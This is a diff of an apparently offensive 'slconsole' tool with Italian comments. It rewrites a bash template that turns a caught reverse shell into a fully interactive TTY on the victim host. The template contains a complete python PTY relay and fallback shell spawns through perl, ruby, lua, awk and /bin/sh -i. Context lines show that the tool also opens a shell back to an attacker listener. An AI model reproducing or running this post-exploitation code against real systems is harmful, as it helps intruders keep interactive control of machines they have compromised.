@@ -108,27 +108,86 @@ echo "[*] Lancio shell stabile verso {lhost}:{lport}..."
 UPGRADE2_TEMPLATE = r"""#!/bin/bash
 # === slconsole in-place shell upgrade ===
 # Upgrada la shell corrente a TTY interattiva senza aprire nuove connessioni.
+# Frecce, tab, Ctrl+C, history — tutto funziona.
 
 echo "[*] Upgrade in-place della shell corrente..."
 
-# Metodo 1: python3 pty.spawn
+# Metodo 1: python3 — full PTY con raw mode + resize
 if command -v python3 >/dev/null 2>&1; then
-    echo "[+] python3 trovato — spawning TTY..."
-    python3 -c 'import pty; pty.spawn("/bin/bash")'
+    echo "[+] python3 trovato — spawning full TTY..."
+    python3 -c '
+import pty,os,sys,select,termios,tty,struct,fcntl,signal
+old=termios.tcgetattr(sys.stdin)
+try:
+    pid,fd=pty.fork()
+    if pid==0:
+        os.environ["TERM"]=os.environ.get("TERM","xterm-256color")
+        os.execvp("/bin/bash",["/bin/bash","-i"])
+    def resize(s=None,f=None):
+        try:
+            w=struct.pack("HHHH",0,0,0,0)
+            r=fcntl.ioctl(sys.stdout,termios.TIOCGWINSZ,w)
+            fcntl.ioctl(fd,termios.TIOCSWINSZ,r)
+        except:pass
+    signal.signal(signal.SIGWINCH,resize)
+    resize()
+    tty.setraw(sys.stdin)
+    while True:
+        r,_,_=select.select([sys.stdin,fd],[],[])
+        if sys.stdin in r:
+            d=os.read(sys.stdin.fileno(),1024)
+            if not d:break
+            os.write(fd,d)
+        if fd in r:
+            d=os.read(fd,1024)
+            if not d:break
+            os.write(sys.stdout.fileno(),d)
+except:pass
+finally:termios.tcsetattr(sys.stdin,termios.TCSADRAIN,old)
+'
     exit 0
 fi
 
-# Metodo 2: python2 pty.spawn
+# Metodo 2: python2 — stesso approccio
 if command -v python >/dev/null 2>&1; then
-    echo "[+] python trovato — spawning TTY..."
-    python -c 'import pty; pty.spawn("/bin/bash")'
+    echo "[+] python trovato — spawning full TTY..."
+    python -c '
+import pty,os,sys,select,termios,tty,struct,fcntl,signal
+old=termios.tcgetattr(sys.stdin)
+try:
+    pid,fd=pty.fork()
+    if pid==0:
+        os.environ["TERM"]=os.environ.get("TERM","xterm-256color")
+        os.execvp("/bin/bash",["/bin/bash","-i"])
+    def resize(s=None,f=None):
+        try:
+            w=struct.pack("HHHH",0,0,0,0)
+            r=fcntl.ioctl(sys.stdout,termios.TIOCGWINSZ,w)
+            fcntl.ioctl(fd,termios.TIOCSWINSZ,r)
+        except:pass
+    signal.signal(signal.SIGWINCH,resize)
+    resize()
+    tty.setraw(sys.stdin)
+    while True:
+        r,_,_=select.select([sys.stdin,fd],[],[])
+        if sys.stdin in r:
+            d=os.read(sys.stdin.fileno(),1024)
+            if not d:break
+            os.write(fd,d)
+        if fd in r:
+            d=os.read(fd,1024)
+            if not d:break
+            os.write(sys.stdout.fileno(),d)
+except:pass
+finally:termios.tcsetattr(sys.stdin,termios.TCSADRAIN,old)
+'
     exit 0
 fi
 
-# Metodo 3: script
+# Metodo 3: script (frecce funzionano, meno controllo)
 if command -v script >/dev/null 2>&1; then
     echo "[+] script trovato — spawning TTY..."
-    script -qc /bin/bash /dev/null
+    SHELL=/bin/bash script -qc /bin/bash /dev/null
     exit 0
 fi
 
@@ -139,15 +198,42 @@ if command -v expect >/dev/null 2>&1; then
     exit 0
 fi
 
-# Metodo 5: perl pty
+# Metodo 5: perl
 if command -v perl >/dev/null 2>&1; then
-    echo "[+] perl trovato — spawning TTY..."
-    perl -e 'exec "/bin/bash";'
+    echo "[+] perl trovato — spawning shell..."
+    perl -e 'exec "/bin/sh";'
+    exit 0
+fi
+
+# Metodo 6: ruby
+if command -v ruby >/dev/null 2>&1; then
+    echo "[+] ruby trovato — spawning shell..."
+    ruby -e 'exec "/bin/sh"'
+    exit 0
+fi
+
+# Metodo 7: lua
+if command -v lua >/dev/null 2>&1; then
+    echo "[+] lua trovato — spawning shell..."
+    lua -e 'os.execute("/bin/sh")'
+    exit 0
+fi
+
+# Metodo 8: awk
+if command -v awk >/dev/null 2>&1; then
+    echo "[+] awk trovato — spawning shell..."
+    awk 'BEGIN {system("/bin/sh")}'
+    exit 0
+fi
+
+# Metodo 9: /bin/sh -i (ultimo tentativo)
+if [ -x /bin/sh ]; then
+    echo "[+] fallback a /bin/sh -i..."
+    /bin/sh -i
     exit 0
 fi
 
 echo "[-] Nessun metodo disponibile per l'upgrade in-place."
-echo "    Metodi cercati: python3, python, script, expect, perl"
 echo "    Usa /upgrade per upgrade via nuova connessione socat."
 exit 1
 """
